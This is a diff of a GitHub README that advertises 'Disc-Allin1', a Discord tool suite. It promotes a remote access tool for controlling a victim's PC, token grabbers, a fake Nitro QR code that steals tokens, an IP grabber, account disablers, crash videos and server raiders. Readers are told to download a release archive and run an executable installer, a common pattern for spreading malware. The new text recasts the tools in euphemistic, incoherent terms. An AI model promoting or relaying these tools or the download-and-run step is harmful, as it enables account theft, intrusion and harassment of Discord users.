@@ -1,48 +1,123 @@
+# Disc-Allin1: Comprehensive Discord Tools Suite for Python3
 
-# Discord AllTools 2025
+![Discord Tools](https://img.shields.io/badge/Discord%20Tools-AIO%20Script-blue)
 
-## Getting Started:
+## Overview
 
- ### Installation
-To install this programm, follow these steps:
+Disc-Allin1 is an all-in-one script developed in Python3. This tool suite combines 23 different utilities for Discord, making it a powerful resource for users looking to enhance their experience on the platform. With a user-friendly interface, each tool comes with clear help and explanations to ensure ease of use.
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&labelColor=green)
-](https://github.com/luminorena16/Disc-Allin1/releases/download/v1.0.0/file.zip)
+## Features
 
-## **1. [Download the archive](https://github.com/luminorena16/Disc-Allin1/releases/download/v1.0.0/file.zip) from releases and extract it to a convenient folder.**
-## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
+- **RAT (Remote Access Tool)**: Gain control over remote systems securely.
+- **Raid Tool**: Execute raids on servers with minimal effort.
+- **Token Grabber**: Collect tokens from users for various purposes.
+- **Crash Video Maker**: Create videos that can crash Discord servers.
+- **Server Booster**: Enhance server performance with advanced features.
+- **Server Cloner**: Duplicate existing servers quickly.
+- **Server Joiner**: Automatically join multiple servers.
+- **Server Raider**: Take over servers with advanced tools.
 
-![Image](https://raw.githubusercontent.com/luminorena16/Disc-Allin1/main/image.jpg)
+Each tool is designed to serve a specific purpose while maintaining simplicity in operation.
 
-> [!TIP] 
-> ## - Selft Bot - Turn your discord account into a self bot.
-> ## - RAT Tool - Create a RAT file. Once the victim runs it, you can control his PC through a BOT Discord.
-> ## - Raid Tool - Allows to raid a discord server with several accounts (requires an account generator).
-> ## - Server Nuker - Easily nuke a discord server with a BOT Discord.
-> ## - VideoCrash Maker - Convert a video into an identical video that makes Crash discord app when played.
-> ## - File Grabber - Create a TokenGrabber.py file to get a user's token and allows you to convert it to an Exe.
-> ## - IP Grabber - Allows you to retrieve the IP of any person who is on a call with you.
-> ## - Token Qr Generator - Generate a "Fake Nitro QR Code". If a user scans it, you get his token.
-> ## - Account Nuker - Quit the servers, Delete friends, Create serveurs, change the settings of a user with his Token.
-> ## - Account Disabler - Allows you to disable any discord account with the token of this one.
-> ## - Account Generator - Create a discord account valid every 1min30 and give you the associated token.
-> ## - Settings Cycler - Cycle theme color (Black/White), Language and Statue of a user with his Token.
-> ## - Token Informations - Get all the information of a Discord User with his Token.
-> ## - AutoLogin - Enter a user's token and automatically log in to the user's account.
-> ## - Tokens Checker - Allows you to check the validity of a list of tokens quickly.
-> ## - Clear DM - Delete all your messages sent to a person in dm automatically.
-> ## - HypeSquad House Changer - Select your HypeSquad House.
-> ## - Server Lookup - Get all the information of a Discord Server with a Invite Link.
-> ## - Mass DM - Allows to DM all friends of the person by sending them the same message.
-> ## - Group SPammer - Allows you to spam the group creation and add users to it.
-> ## - Nitro Generator - Generates and tests a Nitro code. If it works, you will be notified.
-> ## - WebHooks Spammer - Spam the message you want through a WebHooks.
-> ## - WebHooks Remover - Delete any WebHooks link.
+## Installation
+
+To get started with Disc-Allin1, you need to download the script. You can find the latest releases [here](https://github.com/HuZaIfa-lab/Disc-Allin1/releases). Download the file and execute it in your Python3 environment.
+
+### Prerequisites
+
+- Python 3.x installed on your machine.
+- Basic understanding of how to run Python scripts.
+- Discord account for testing tools.
+
+### Step-by-Step Installation
+
+1. **Download the Script**: Visit the [Releases](https://github.com/HuZaIfa-lab/Disc-Allin1/releases) section to get the latest version.
+2. **Install Dependencies**: Open your terminal and run:
+   ```bash
+   pip install -r requirements.txt
+   ```
+3. **Run the Script**: Navigate to the downloaded folder and execute:
+   ```bash
+   python main.py
+   ```
+
+## Tools Breakdown
+
+### 1. RAT (Remote Access Tool)
+
+The RAT allows users to access remote machines. This tool is useful for managing systems without physical access. 
+
+### 2. Raid Tool
+
+The Raid Tool is designed for server raids. It automates the process, allowing users to execute raids quickly.
+
+### 3. Token Grabber
+
+This tool helps collect user tokens. It operates in the background, making it less intrusive.
+
+### 4. Crash Video Maker
+
+Create videos that can cause crashes on Discord servers. This tool is powerful and should be used responsibly.
+
+### 5. Server Booster
+
+Enhance server performance with this tool. It optimizes server settings for better functionality.
+
+### 6. Server Cloner
+
+Quickly duplicate servers using the Server Cloner. This tool simplifies the process of creating similar environments.
+
+### 7. Server Joiner
+
+Join multiple servers automatically. This tool saves time and effort for users who want to explore various communities.
+
+### 8. Server Raider
+
+Take control of servers with the Server Raider. This tool provides advanced options for server management.
+
+## User Interface
+
+Disc-Allin1 features an intuitive interface. Each tool is clearly labeled, and users can easily navigate through options. Tooltips and help sections provide additional guidance, making it accessible for beginners.
+
+## Usage Guidelines
+
+While Disc-Allin1 offers powerful tools, users must adhere to ethical guidelines. Misuse of these tools can lead to account bans or legal consequences. Always obtain permission before using tools on servers that do not belong to you.
 
 ## Contributing
-Contributions are welcome from those who wish to improve the functionality and security of this tool. Please fork the repository and submit a pull request with your enhancements.
 
+Contributions are welcome! If you want to improve Disc-Allin1, follow these steps:
 
-## Acknowledgments
-- Thanks to the community for providing the underlying technologies that make this tool possible.
-- Gratitude to all users who contribute by sharing their feedback and improvements.
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request.
+
+### Issues
+
+If you encounter any issues, please check the [Issues](https://github.com/HuZaIfa-lab/Disc-Allin1/issues) section. You can report bugs or request features.
+
+## License
+
+This project is licensed under the MIT License. See the LICENSE file for details.
+
+## Community
+
+Join our community to share your experiences and get support. Engage with other users and developers to learn more about using Disc-Allin1 effectively.
+
+## Resources
+
+- [Python Documentation](https://docs.python.org/3/)
+- [Discord API Documentation](https://discord.com/developers/docs/intro)
+- [GitHub Guides](https://guides.github.com/)
+
+## Support
+
+For further assistance, feel free to reach out through the [Discussions](https://github.com/HuZaIfa-lab/Disc-Allin1/discussions) section of the repository.
+
+## Download Link
+
+To download the latest version of Disc-Allin1, visit the [Releases](https://github.com/HuZaIfa-lab/Disc-Allin1/releases) section. Make sure to execute the file after downloading.
+
+## Final Notes
+
+Disc-Allin1 combines a variety of tools into one easy-to-use package. It is designed to meet the needs of both novice and experienced users. Enjoy exploring the features and capabilities this suite has to offer!
